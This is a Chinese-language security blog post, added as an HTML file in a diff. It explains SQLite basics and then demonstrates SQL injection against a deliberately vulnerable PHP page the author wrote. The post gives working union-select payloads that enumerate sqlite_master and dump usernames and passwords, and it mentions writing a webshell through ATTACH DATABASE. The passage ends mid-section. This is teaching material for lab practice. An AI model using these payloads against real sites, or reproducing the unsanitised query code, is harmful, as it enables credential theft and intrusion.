@@ -1,0 +1,382 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>SQLite注入 | lu1ux's blog</title><meta name="author" content="lu1ux"><meta name="copyright" content="lu1ux"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="SQLite注入简介SQLite 是一个嵌入式 SQL 数据库引擎。与大多数其他 SQL 数据库不同，SQLite 没有独立的服务器进程。SQLite 直接读写普通磁盘文件。一个包含多个表、索引、触发器和视图的完整 SQL 数据库包含在一个磁盘文件中，但也因为轻型，所以不可避免的有一些安全隐患，比如数据库下载，有固定&#x2F;默认数据库名&#x2F;地址的问题，可下载造成安全威胁。 SQLite">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQLite注入">
+<meta property="og:url" content="http://example.com/2025/11/25/SQLite%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="lu1ux&#39;s blog">
+<meta property="og:description" content="SQLite注入简介SQLite 是一个嵌入式 SQL 数据库引擎。与大多数其他 SQL 数据库不同，SQLite 没有独立的服务器进程。SQLite 直接读写普通磁盘文件。一个包含多个表、索引、触发器和视图的完整 SQL 数据库包含在一个磁盘文件中，但也因为轻型，所以不可避免的有一些安全隐患，比如数据库下载，有固定&#x2F;默认数据库名&#x2F;地址的问题，可下载造成安全威胁。 SQLite">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/img/14.png">
+<meta property="article:published_time" content="2025-11-25T13:37:44.000Z">
+<meta property="article:modified_time" content="2025-11-25T13:38:18.944Z">
+<meta property="article:author" content="lu1ux">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/14.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2025/11/25/SQLite%E6%B3%A8%E5%85%A5/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Error',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'SQLite注入',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-11-25 21:38:18'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="//at.alicdn.com/t/c/font_4066449_d5kq6u6u9dj.css"><link rel="stylesheet" href="/css/mine.css"><meta name="generator" content="Hexo 8.1.1"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load',() => { preloader.endLoading() })
+
+  if (false) {
+    document.addEventListener('pjax:send', () => { preloader.initLoading() })
+    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+  }
+})()</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avator.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">23</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">14</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-zhuye"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-archive-solid"></i><span> 归档</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/14.png')"><nav id="nav"><span id="blog-info"><a href="/" title="lu1ux's blog"><span class="site-name">lu1ux's blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-zhuye"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-archive-solid"></i><span> 归档</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">SQLite注入</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-11-25T13:37:44.000Z" title="Created 2025-11-25 21:37:44">2025-11-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-11-25T13:38:18.944Z" title="Updated 2025-11-25 21:38:18">2025-11-25</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="SQLite注入"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="SQLite注入"><a href="#SQLite注入" class="headerlink" title="SQLite注入"></a>SQLite注入</h1><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>SQLite 是一个嵌入式 SQL 数据库引擎。与大多数其他 SQL 数据库不同，SQLite 没有独立的服务器进程。SQLite 直接读写普通磁盘文件。一个包含多个表、索引、触发器和视图的完整 SQL 数据库包含在一个磁盘文件中，但也因为轻型，所以不可避免的有一些安全隐患，比如数据库下载，有固定&#x2F;默认数据库名&#x2F;地址的问题，可下载造成安全威胁。</p>
+<p><strong>SQLite对于其他数据库有什么优势：</strong></p>
+<ul>
+<li>不需要配置，不需要安装和管理</li>
+<li>不需要一个单独的服务器进程或操作的系统（无服务器的）</li>
+<li>一个完整的SQLite数据库存储在一个单一的跨平台的磁盘文件上</li>
+<li>SQLite是非常小的，轻量级的数据库，完全配置时小于400<a target="_blank" rel="noopener" href="https://www.cnblogs.com/l199616j/p/10693918.html">KiB</a>，省略可选功能配置时小于250<a target="_blank" rel="noopener" href="https://www.cnblogs.com/l199616j/p/10693918.html">KiB</a></li>
+<li>SQLite是一个自给自足的数据库，这也就意味着不需要任何外部的依赖</li>
+<li>SQLite事务是完全兼容<a target="_blank" rel="noopener" href="https://www.cnblogs.com/l199616j/p/10694034.html">ACID</a>的，允许从多个进程或线程安全访问</li>
+<li>SQLite支持SQL92（SQL2）标准的大多数查询语言的功能</li>
+<li>SQLite使用ANSI-C编写的，并提供了简单和易于使用的API</li>
+<li>SQLite可在UINX（Linux，Max OS-X,Android，iOS）和Windows（Win32，WinCE，WinRT）中运行</li>
+</ul>
+<h3 id="SQLite基础"><a href="#SQLite基础" class="headerlink" title="SQLite基础"></a>SQLite基础</h3><p>SQLite和mysql等还是有些区别的，sqlite的每一个数据库就是一个文件。</p>
+<h5 id="SQLite创建数据库"><a href="#SQLite创建数据库" class="headerlink" title="SQLite创建数据库"></a>SQLite<strong>创建数据库</strong></h5><p>SQLite 的 <code>sqlite3</code> 命令被用来创建新的 SQLite 数据库。您不需要任何特殊的权限即可创建一个数据。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlite test.db</span><br></pre></td></tr></table></figure>
+
+<p>这个命令执行后就会在当前目录下生成对应名称的文件，之后的数据操作都是对该文件的操作。</p>
+<p>执行这个命令成功创建数据库文件之后，将提供一个 sqlite&gt; 提示符。</p>
+<p>数据库成功创建后可以使用 SQLite 的<code> .databases</code> 命令来查看当前数据库</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213815098.png" alt="image-20250326185758615"></p>
+<p>查看目录发现保存了一个名为<code>test.db</code>的文件 </p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213815069.png" alt="image-20250326190525740"></p>
+<h5 id="SQLite打开数据库"><a href="#SQLite打开数据库" class="headerlink" title="SQLite打开数据库"></a>SQLite<strong>打开数据库</strong></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.open FILENAME</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="SQLite-附加数据库"><a href="#SQLite-附加数据库" class="headerlink" title="SQLite 附加数据库"></a>SQLite 附加数据库</h5><p>假设这样一种情况，当在同一时间有多个数据库可用，您想使用其中的任何一个。SQLite 的 <code>ATTACH DATABASE</code> 语句是用来选择一个特定的数据库。SQLite 的 <code>ATTACH DATABASE</code> 语句的基本语法如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ATTACH DATABASE file_name AS database_name;</span><br></pre></td></tr></table></figure>
+
+<p>打开的数据库和使用 ATTACH 附加进来的数据库的必须位于同一文件夹下。如果数据库尚未被创建，上面的命令将创建一个数据库。</p>
+<p>如下，我们想附加一个数据库 testDB.db：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ATTACH DATABASE &#x27;testDB.db&#x27; AS &#x27;TEST&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>执行<code>.database</code>命令后，可以看到成功附加了一个 TEST：</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213815142.png" alt="image-20250326190404597"></p>
+<p>在特定情况下，我们可以通过<strong>附加数据库</strong>的方式写入 Webshell。</p>
+<h5 id="SQLite创建表"><a href="#SQLite创建表" class="headerlink" title="SQLite创建表"></a>SQLite创建表</h5><p>SQLite 的 CREATE TABLE 语句用于在任何给定的数据库创建一个新表。<code>CREATE TABLE </code>语句的基本语法如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE database_name.table_name(</span><br><span class="line">   column1 datatype  PRIMARY KEY(one or more columns),</span><br><span class="line">   column2 datatype,</span><br><span class="line">   column3 datatype,</span><br><span class="line">   .....</span><br><span class="line">   columnN datatype,</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p>如下实例，我们创建了一个 users 表，ID 作为主键，NOT NULL 的约束表示在表中创建纪录时这些字段不能为 NULL：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE users(</span><br><span class="line">   id INT PRIMARY KEY     NOT NULL,</span><br><span class="line">   username           TEXT    NOT NULL,</span><br><span class="line">   password           TEXT    NOT NULL,</span><br><span class="line">   age            INT     NOT NULL</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213815094.png" alt="image-20250326191449447"></p>
+<h5 id="SQLite查看表"><a href="#SQLite查看表" class="headerlink" title="SQLite查看表"></a>SQLite查看表</h5><p><code>.tables</code> 命令用来列出附加数据库中的所有表。</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213814878.png" alt="image-20250326191708344"></p>
+<p><code>.schema</code> 命令得到表的完整信息:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.schema users</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213815106.png" alt="image-20250326204744263"></p>
+<p>值得注意的一点是得到的结果是我们创建表时执行的命令语句，这也是sqlite的特点</p>
+<h5 id="SQLite插入数据"><a href="#SQLite插入数据" class="headerlink" title="SQLite插入数据"></a>SQLite插入数据</h5><p>SQLite 的 <code>INSERT INTO</code> 语句用于向数据库的某个表中添加新的数据行。语法如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO TABLE_NAME [(column1, column2, column3,...columnN)] VALUES (value1, value2, value3,...valueN);</span><br></pre></td></tr></table></figure>
+
+<p>下面的语句将在users表中创建四个记录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO users (id,username,password,age) VALUES (1, &#x27;Admin&#x27;, &#x27;123456&#x27;, 18);</span><br><span class="line">INSERT INTO users (id,username,password,age) VALUES (2, &#x27;lulu&#x27;, &#x27;41228&#x27;, 20);</span><br><span class="line">INSERT INTO users (id,username,password,age) VALUES (3, &#x27;lu1ux&#x27;, &#x27;60606&#x27;, 20);</span><br><span class="line">INSERT INTO users (id,username,password,age) VALUES (4, &#x27;lhb&#x27;, &#x27;666666&#x27;, 21);</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="SQLite查询语句"><a href="#SQLite查询语句" class="headerlink" title="SQLite查询语句"></a>SQLite查询语句</h5><p>SQLite 的 <code>SELECT</code> 语句用于从 SQLite 数据库表中获取数据，以结果表的形式返回数据。<code>SELECT</code> 语句语法如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT column1, column2, columnN FROM table_name;</span><br></pre></td></tr></table></figure>
+
+<p>如下我们查询刚刚创建的 users 表：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlite&gt; SELECT * FROM users;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213815571.png" alt="image-20250326211019573"></p>
+<p>看起来很难受,用两个命令设置一下格式化输出</p>
+<p><strong><code>.header on</code></strong>：这个命令用于显示列名</p>
+<p><strong><code>.mode column</code></strong>：这个命令将查询结果以列格式进行显示，每个结果将按列对齐</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213815646.png" alt="image-20250326211154582"></p>
+<h5 id="SQLite-注释"><a href="#SQLite-注释" class="headerlink" title="SQLite 注释"></a>SQLite 注释</h5><p>与 MySQL 常见的注释符 # 不同，SQLite 的注释符以两个连续的 “-” 字符（ASCII 0x2d）开始，并扩展至下一个换行符（ASCII 0x0a）或直到输入结束，以先到者为准。</p>
+<p>您也可以使用 C 风格的注释，以 &#x2F;* 开始，并扩展至下一个 *&#x2F; 字符对或直到输入结束，以先到者为准。SQLite 的注释可以跨越多行。</p>
+<h5 id="SQLite-sqlite-master-表"><a href="#SQLite-sqlite-master-表" class="headerlink" title="SQLite sqlite_master 表"></a>SQLite sqlite_master 表</h5><p><code>sqlite_master</code> 表是 SQLite 的系统表，是为每个 SQLite 数据库自动创建的特殊表。该表记录该数据库中保存的表、索引、视图、和触发器信息，每一行记录一个项目。在创建一个 SQLite 数据库的时候，该表会自动创建。如下查看 <code>sqlite_master</code> 表的结构，发现其包含 5 列：<br><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213815741.png" alt="image-20250326212823061"></p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213815754.png" alt="image-20250326213204067"></p>
+<ul>
+<li><code>type</code> 列记录了项目的类型，如 <code>table</code>、<code>index</code>、<code>view</code>、<code>trigger</code>。</li>
+<li><code>name</code> 列记录了项目的名称，如表名、索引名等。</li>
+<li><code>tbl_name</code> 列记录所从属的表名，如索引所在的表名。对于表来说，该列就是表名本身。</li>
+<li><code>rootpage</code> 列记录项目在数据库页中存储的编号。对于视图和触发器，该列值为 0 或者 NULL。</li>
+<li><code>sql</code> 列记录创建该项目的 SQL 语句。</li>
+</ul>
+<p>他保存了执行的 sql 语句，也是之后注入查询表名列名的关键.</p>
+<p>可知，<code>sqlite_master</code> 表中的 sql 字段中记录着你建表留下的完整的记录，也就是说我们在注入的时候可以通过查询 <code>sqlite_master</code> 表来获取数据库中的表名以及表结构，这就像我们在 MySQL 注入中查询 <code>information_schema</code> 一样。</p>
+<p>同时，由于使用 CREATE 或 DROP 创建或销毁表在实际上与从特殊的 sqlite_master 表中执行 INSERT 或 DELETE 语句相同，所以当我们在特殊情况下可以通过操作 sqlite_master 表来创建或删除数据库表。</p>
+<h3 id="SQLite注入-1"><a href="#SQLite注入-1" class="headerlink" title="SQLite注入"></a>SQLite注入</h3><p>编写一个testSQLite.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   class MyDB extends SQLite3</span><br><span class="line">   &#123;</span><br><span class="line">      function __construct()</span><br><span class="line">      &#123;</span><br><span class="line">         $this-&gt;open(&#x27;DatabaseName.db&#x27;);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   $db = new MyDB();</span><br><span class="line">   if(!$db)&#123;</span><br><span class="line">      echo $db-&gt;lastErrorMsg();</span><br><span class="line">   &#125; else &#123;</span><br><span class="line">      echo &quot;You can query users by ID.\n&lt;/br&gt;&quot;;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   $id = $_POST[&#x27;id&#x27;];</span><br><span class="line">   $sql =&lt;&lt;&lt;EOF</span><br><span class="line">      SELECT * from users where id=&#x27;$id&#x27;;</span><br><span class="line">   EOF;</span><br><span class="line">   $ret = $db-&gt;query($sql);</span><br><span class="line">   if($ret==FALSE)&#123;</span><br><span class="line">      echo &quot;Error in fetch &quot;.$db-&gt;lastErrorMsg();</span><br><span class="line">   &#125;</span><br><span class="line">   else&#123;</span><br><span class="line">      while($row = $ret-&gt;fetchArray(SQLITE3_ASSOC) )&#123;</span><br><span class="line">         echo &quot;ID = &quot;. $row[&#x27;id&#x27;] . &quot;&lt;/br&gt;&quot;;</span><br><span class="line">         echo &quot;Username = &quot;. $row[&#x27;username&#x27;] .&quot;&lt;/br&gt;&quot;;</span><br><span class="line">         echo &quot;Password = &quot;. $row[&#x27;password&#x27;] .&quot;&lt;/br&gt;&quot;;</span><br><span class="line">      &#125;</span><br><span class="line">      //var_dump($ret-&gt;fetchArray(SQLITE3_ASSOC));</span><br><span class="line">   &#125;   </span><br><span class="line"></span><br><span class="line">   $db-&gt;close();</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>把上文创建的<code>test.db</code>文件重命名为<code>DatabaseName.db</code>放在网页根目录</p>
+<p>正常查询:</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213815876.png" alt="image-20250330143414976"></p>
+<p>尝试闭合单引号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213815881.png" alt="image-20250330143543882"></p>
+<p>尝试使用分号闭合SQL语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213816146.png" alt="image-20250330143625087"></p>
+<p>也可以使用<code>--</code>或<code>/*</code>进行注释</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27;--</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27;/*</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213816246.png" alt="image-20250330143759645"></p>
+<h4 id="查询-SQL-语句字段数"><a href="#查询-SQL-语句字段数" class="headerlink" title="查询 SQL 语句字段数"></a>查询 SQL 语句字段数</h4><p>和MySQL一样,可以使用<code>group by</code> <code>order by</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27; group by 5;</span><br><span class="line">id=-1&#x27; group by 5--</span><br><span class="line">id=-1&#x27; group by 5/*</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213816392.png" alt="image-20250330144001841"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27; order by 5/*</span><br><span class="line">id=-1&#x27; order by 5;</span><br><span class="line">id=-1&#x27; order by 5--</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/./../../../AppData/Roaming/Typora/typora-user-images/image-20250330144117649.png" alt="image-20250330144117649"></p>
+<p>可以查出字段数为4</p>
+<h4 id="查询回显位"><a href="#查询回显位" class="headerlink" title="查询回显位"></a>查询回显位</h4><p>和MySQL一样,可以通过 <code>union select</code>联合查询</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27; union select 1,2,3,4;</span><br><span class="line">id=-1&#x27; union select 1,2,3,4 --</span><br><span class="line">id=-1&#x27; union select 1,2,3,4/*</span><br></pre></td></tr></table></figure>
+
+<p><img src="/./../../../AppData/Roaming/Typora/typora-user-images/image-20250330144421109.png" alt="image-20250330144421109"></p>
+<p>可知字段数为4,并且回显位为1,2,3</p>
+<h4 id="查询表名和列名"><a href="#查询表名和列名" class="headerlink" title="查询表名和列名"></a>查询表名和列名</h4><p>这里直接通过查询<code>sqlite_master</code>表来实现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,2,(select sql from sqlite_master limit 0,1),4;</span><br><span class="line">-1&#x27; union select 1,2,(select sql from sqlite_master limit 0,1),4 -- </span><br><span class="line">-1&#x27; union select 1,2,(select sql from sqlite_master limit 0,1),4/*</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213816478.png" alt="image-20250330144655497"></p>
+<p>如图所示,得到了我当时创建表时的语句</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213816521.png" alt="image-20250330144736284"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE users(</span><br><span class="line">id INT PRIMARY KEY	NOT NULL,</span><br><span class="line">username	test	NOT NULL,</span><br><span class="line">password	TEST	NOT NULL,</span><br><span class="line">age		INT	NOT NULL</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>从语句中我们得知当前表名为 users，其中有 id、username、password、age 这四个字段。</p>
+<p>当存在多个表时，我们可以用 limit 关键字逐行读取，也可以使用 group_concat 关键字进行聚合：</p>
+<h4 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h4><p>得到表明和字段名之后我们便可以查询数据了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27; union select 1,2,(select group_concat(username,password) from users),4;</span><br><span class="line">id=-1&#x27; union select 1,2,(select group_concat(username,password) from users),4 --</span><br><span class="line">id=-1&#x27; union select 1,2,(select group_concat(username,password) from users),4/*</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213816665.png" alt="image-20250330145355357"></p>
+<p>发现一次显示不全,使用<code>substr()</code>函数,并使用<code>||</code>字符串拼接操作符</p>
